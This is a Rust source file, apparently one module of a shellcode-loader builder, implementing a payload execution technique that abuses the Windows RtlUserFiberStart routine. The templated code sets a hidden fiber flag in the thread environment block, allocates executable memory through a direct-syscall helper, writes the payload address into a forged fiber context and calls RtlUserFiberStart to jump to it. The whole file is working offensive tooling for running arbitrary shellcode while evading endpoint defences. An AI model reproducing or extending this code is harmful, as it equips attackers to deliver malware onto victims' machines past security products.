use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct RtlUserFiberStart;

impl Technique for RtlUserFiberStart {
    fn meta(&self) -> &'static TechniqueMeta { &RTL_USER_FIBER_START_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");

        let helpers = r#"
type RtlUserFiberStartFn = unsafe extern "system" fn() -> i32;

#[inline]
unsafe fn rtl_get_teb() -> *mut u8 {
    let teb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb, options(nostack, preserves_flags));
    teb
}
"#;
        ctx.set_replacement("{{INJECTION_HELPERS}}", helpers.to_string());

        let body = r#"
        const TEB_FLAGS_OFFSET: usize = 0x20;
        const FIBER_CONTEXT_RIP_OFFSET: usize = 0x0A8;
        const HAS_FIBER_DATA_BIT: u8 = 0b100;

        let ntdll = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
        if ntdll.is_null() { return; }
        let rtl_ptr = GetProcAddress(ntdll, b"RtlUserFiberStart\0".as_ptr() as *const i8);
        if rtl_ptr.is_null() { return; }

        let teb = rtl_get_teb();
        *teb.add(TEB_FLAGS_OFFSET) |= HAS_FIBER_DATA_BIT;

        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }

        let heap = windows_sys::Win32::System::Memory::GetProcessHeap();
        if heap.is_null() { return; }
        let fiber_data = windows_sys::Win32::System::Memory::HeapAlloc(heap, 0, 0x100);
        if fiber_data.is_null() { return; }

        *(fiber_data as *mut *mut std::ffi::c_void).add(FIBER_CONTEXT_RIP_OFFSET / 8) = addr as *mut std::ffi::c_void;

        std::arch::asm!("mov gs:[0x20], {}", in(reg) fiber_data, options(nostack));

        let rtl_fn: RtlUserFiberStartFn = std::mem::transmute(rtl_ptr);
        let _ = rtl_fn();

        windows_sys::Win32::System::Memory::HeapFree(heap, 0, fiber_data);
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::RTL_USER_FIBER_START_META;
